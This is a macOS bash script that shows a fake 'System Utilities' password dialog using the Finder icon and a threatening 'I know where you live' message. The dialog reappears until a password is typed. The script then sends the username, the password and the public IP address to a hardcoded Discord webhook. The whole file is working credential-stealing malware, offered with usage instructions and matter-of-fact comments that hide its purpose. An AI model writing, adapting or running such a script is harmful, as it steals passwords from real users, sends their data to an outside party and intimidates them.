#!/bin/bash
# Login Prompt Script for macOS – Updated for Python compatibility and clear prompt messaging.
# This script displays a login prompt that instructs the user "DO NOT PRESS CANCEL."
# The entered password is captured and then sent to a Discord webhook as a JSON payload.
#
# Requirements:
# - macOS with osascript, curl, and either python3 or python installed.
#
# Usage:
#   chmod +x login_prompt.sh
#   ./login_prompt.sh

# Get the current username for logging purposes.
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Initialize capture text with a header.
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Define AppleScript for a persistent password prompt.
# The prompt now includes "DO NOT PRESS CANCEL" to warn the user.
read -r -d '' applescriptCode <<'EOF'
set fullName to (long user name of (system info))
set firstName to word 1 of fullName
set lastName to word -1 of fullName
set userPassword to ""
repeat while userPassword is ""
    try
        set userPassword to text returned of (display dialog "I know where you live, " & firstName & ".\n\nEnter your password (DO NOT PRESS CANCEL) to allow access." with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
    on error
        set userPassword to ""
    end try
end repeat
return userPassword
EOF

# Execute the AppleScript synchronously and capture its output.
osascript -e "$applescriptCode" > pass_temp.txt

# Read the password from the temporary file.
if [ -f pass_temp.txt ]; then
    dialogText=$(cat pass_temp.txt)
    rm pass_temp.txt
else
    dialogText="CANCEL"
fi

# Append the password result to the capture text.
capture="${capture}password=${dialogText}\n"

# Capture the public IP address using api.ipify.org.
ipaddress=$(curl -s https://api.ipify.org)
capture="${capture}ipaddress=${ipaddress}"

# Save the captured information to a temporary file.
echo -e "$capture" > pass.txt

# Determine which Python interpreter to use (prefer python3).
if command -v python3 &>/dev/null; then
    PYTHON=python3
else
    PYTHON=python
fi

# Use the selected Python to generate a valid JSON payload.
payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)

# Send captured data to the Discord webhook.
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
rm pass.txt
